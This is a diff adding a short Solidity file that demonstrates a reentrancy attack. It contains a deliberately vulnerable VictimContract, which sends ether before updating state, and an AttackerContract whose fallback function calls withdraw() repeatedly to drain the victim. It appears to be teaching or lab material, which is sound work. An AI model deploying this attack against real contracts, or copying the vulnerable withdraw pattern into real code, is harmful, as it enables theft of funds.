@@ -1,0 +1,52 @@
+pragma solidity ^0.5.1;
+
+contract VictimContractInterface {
+    function withdraw() public payable;
+}
+
+contract VictimContract {
+    
+
+    uint256 toTransfer = 1 ether;
+
+    function withdraw() public payable {
+        // Send 1 coin
+        msg.sender.call.value(toTransfer)("");
+        // Deduct balance by 1
+        toTransfer = 0;
+    }
+
+    // Use depost() to send 10 ether to contract
+    function deposit() public payable{}
+}
+
+contract AttackerContract {
+    address victim;
+
+    constructor(address _victim) public {
+        victim = _victim;
+    }
+    
+    // Trigger the attack
+    function attack() public payable {
+        VictimContract vc  = VictimContract(victim);
+        vc.withdraw();
+    }
+    
+    function () external payable {
+        if (getVictimBalance()==0){
+            return;
+        }
+        else{
+            attack();
+        }
+    }
+
+    function getAttackerBalance() public view returns (uint) {
+        return address (this).balance;
+    }
+    
+    function getVictimBalance() public view returns (uint) {
+        return address (victim).balance;
+    }
+}
